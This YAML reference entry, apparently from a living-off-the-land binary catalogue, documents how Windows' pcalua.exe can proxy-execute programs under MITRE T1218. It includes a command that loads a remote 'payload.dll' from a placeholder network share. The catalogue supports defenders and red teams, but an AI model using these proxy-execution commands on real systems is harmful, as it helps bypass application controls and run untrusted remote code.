---
name: Pcalua.exe
description: Program Compatibility Assistant
functions:
  execute:
    - description: Open the target .EXE using the Program Compatibility Assistant.
      code: pcalua.exe -a calc.exe
      mitreid: T1218
      mitrelink: https://attack.mitre.org/wiki/Technique/T1218
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Proxy execution of binary
    - description: Open the target .DLL file with the Program Compatibilty Assistant.
      code: pcalua.exe -a \\server\payload.dll
      mitreid: T1218
      mitrelink: https://attack.mitre.org/wiki/Technique/T1218
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Proxy execution of remote dll file
    - description: Open the target .CPL file with the Program Compatibility Assistant.
      code: pcalua.exe -a C:\Windows\system32\javacpl.cpl -c Java
      mitreid: T1218
      mitrelink: https://attack.mitre.org/wiki/Technique/T1218
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Execution of CPL files
resources:
    - resource: https://twitter.com/KyleHanslovan/status/912659279806640128
fullpath:
    - path: C:\Windows\System32\pcalua.exe
detection:
  - IOC: 
acknowledgement:
  - Person: Kyle Hanslovan
    Handle: '@kylehanslovan'
  - Person: Fab
    Handle: '@0rbz_'
---
